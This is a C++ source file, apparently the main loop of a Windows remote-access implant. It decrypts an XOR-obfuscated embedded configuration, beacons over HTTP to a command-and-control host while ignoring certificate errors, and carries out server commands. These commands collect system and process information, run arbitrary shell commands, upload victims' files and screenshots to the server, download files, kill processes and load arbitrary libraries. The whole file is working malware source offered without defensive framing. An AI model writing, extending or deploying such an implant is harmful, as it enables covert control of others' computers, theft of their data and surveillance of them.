#include "core.h"

void mainloop() {
	Endpoints e;
	Configuration c;
	c.endpoints = e;
	std::string res = xorConfig((char*)CONFIG_BUFFER);
	initializeConfig(&c, res.c_str());
	std::cout << c.hostname << "\n";

	HANDLE hInternet = InternetOpenA(c.hostname.c_str(), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
	HANDLE hConnect = InternetConnectA(hInternet, c.hostname.c_str(), c.port, NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL);
	HANDLE hRequest = HttpOpenRequestA(hConnect, c.strings.post.c_str(), c.endpoints.heartbeat.c_str(), NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_IGNORE_CERT_CN_INVALID, NULL);
	HttpEndRequestA(hRequest, NULL, NULL, NULL);

	while (true) {
		HANDLE hRequest = HttpOpenRequestA(hConnect, c.strings.post.c_str(), c.endpoints.heartbeat.c_str(), NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_IGNORE_CERT_CN_INVALID, NULL);
		std::string response = sendRequestGetResponse(hRequest);
		response = decode(c.key, response);

		//Process request here. If first part of string is a 1, do this... 2 do this... etc.
		std::string code = response.substr(0, response.find(" "));
		std::string outString;
		size_t first;
		size_t second;
		switch (atoi(code.c_str())) {
		case 1:
			//OK
			break;
		case 2:
			//INFO
			outString = gatherInfo(&c.strings, hInternet);
			std::cout << outString << "\n";
			sendEncodedString(&c.strings, c.key, outString, c.endpoints.info, hConnect);
			break;
		case 3:
			//PS
			outString = getProcToStr();
			std::cout << outString << "\n";
			sendEncodedString(&c.strings, c.key, outString, c.endpoints.ps, hConnect);
			break;
		case 4:
			//RUN
			outString = execCmd(&c.strings, response.substr(response.find(" ") + 1), c.cmdtimeout);
			std::cout << outString << "\n";
			sendEncodedString(&c.strings, c.key, outString, c.endpoints.out, hConnect);
			break;
		case 5:
			//UPLOAD
			doFileUpload(&c.strings, hConnect, (char*)response.substr(response.find(" ") + 1).c_str(), c.xorKey, c.endpoints.upload.c_str());
			break;
		case 6:
			//DOWNLOAD
			first = response.find(" ");
			second = response.find(" ", first + 1);
			doFileDownload(response.substr(first + 1, second - 2), response.substr(second + 1));
			break;
		case 7:
			//KILL
			killProcess(atoi(response.substr(response.find(" ") + 1).c_str()));
			break;
		case 8:
			//SCREENSHOT
			doScreenshotUpload(&c.strings, hConnect, takeScreenshotAndSaveToMemory(), c.xorKey, c.endpoints.upload.c_str());
			break;
		case 9:
			//LOADLIBRARY
			LoadLibraryA(response.substr(response.find(" ") + 1).c_str());
		default:
			break;
		}
		HttpEndRequestA(hRequest, NULL, NULL, NULL);
		Sleep(c.sleeptime);
	}
	return;
}